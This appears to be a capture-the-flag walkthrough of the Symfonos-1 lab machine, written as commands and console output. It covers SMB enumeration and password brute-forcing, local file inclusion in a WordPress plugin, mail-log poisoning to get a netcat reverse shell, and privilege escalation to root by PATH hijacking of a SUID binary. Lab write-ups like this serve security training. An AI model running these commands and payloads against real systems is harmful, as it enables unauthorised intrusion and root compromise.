
Samba anonymous --> username helios --> URL WP -->  plugin faille web editor --> reverse shell --> SUID file --> Gain root privileges


```console
$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.46
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 09:18 CEST
Nmap scan report for 192.168.110.46
Host is up (0.00049s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:96:4A:06 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h39m57s, deviation: 2h53m12s, median: 1h59m57s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2021-09-15T04:18:56-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-15T09:18:56
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.110.46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds

```


```console

$ enum4linux 192.168.110.46
 =========================================== 
|    Share Enumeration on 192.168.110.46    |
 =========================================== 

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    helios          Disk      Helios personal share
    anonymous       Disk      
    IPC$            IPC       IPC Service (Samba 4.5.16-Debian)

```


smbclient //192.168.110.46/anonymous
smbclient //192.168.110.46/helios -U helios

medusa -u helios -P passwords.txt -h 192.168.110.46 -M smbnt


//192.168.110.46/helios



curl http://symfonos.local/h3l105/wp-content/uploads


└─$ searchsploit wordpress site editor 
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
WordPress Plugin Site Editor 1.1.1 - Local File Inclusio | php/webapps/44340.txt
WordPress Plugin User Role Editor 3.12 - Cross-Site Requ | php/webapps/25721.txt
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/symfonos-1]
└─$ searchsploit -m php/webapps/44340.txt


curl http://192.168.110.46/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

$ telnet smtp.free.fr 25
Trying 212.27.48.4...
Connected to smtp.free.fr.
Escape character is '^]'.
220 smtp4-g21.free.fr ESMTP Postfix
HELO test.domain.com
250 smtp4-g21.free.fr
MAIL FROM:<test@domain.com>
250 2.1.0 Ok
RCPT TO:<toto@domain.fr>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: test message
This is the body of the message!
.
250 2.0.0 Ok: queued as 2D8FD4C80FF
quit
221 2.0.0 Bye
Connection closed by foreign host.



curl -s -G --data-urlencode "ajax_path=/var/mail/helios"  --data-urlencode "cmd=nc 192.168.110.1 443 -e /bin/sh" http://192.168.110.46/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php


python -c 'import pty; pty.spawn("/bin/sh")'

define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );



$ mysql -uwordpress -ppassword123 -hlocalhost wordpress

$ find / -perm -u=s -type f 2>/dev/null
/opt/statuscheck


$ strings /opt/statuscheck
strings /opt/statuscheck

curl -I H
http://lH
ocalhostH


curl -I H http://localhost


$ curl -I H http://localhost
curl -I H http://localhost
curl: (6) Could not resolve host: H
HTTP/1.1 200 OK
Date: Wed, 15 Sep 2021 12:18:11 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html

$ /opt/statuscheck
/opt/statuscheck
HTTP/1.1 200 OK
Date: Wed, 15 Sep 2021 12:18:27 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html



echo cp /bin/sh /tmp/sh > /tmp/curl
echo chown root:root /tmp/sh >> /tmp/curl
echo chmod 4755 /tmp/sh >> /tmp/curl
chmod +x /tmp/curl

export PATH=/tmp:$PATH

ls -al /tmp/curl
-rwxr-xr-x 1 helios helios 62 Sep 15 07:19 /tmp/curl

$ /opt/statuscheck

$ ls -al /tmp/sh
ls -al /tmp/sh
-rwsr-xr-x 1 root root 117208 Sep 15 07:19 /tmp/sh

$ id  
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

$ /tmp/sh
# id
uid=1000(helios) gid=1000(helios) euid=0(root) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
# whoami

root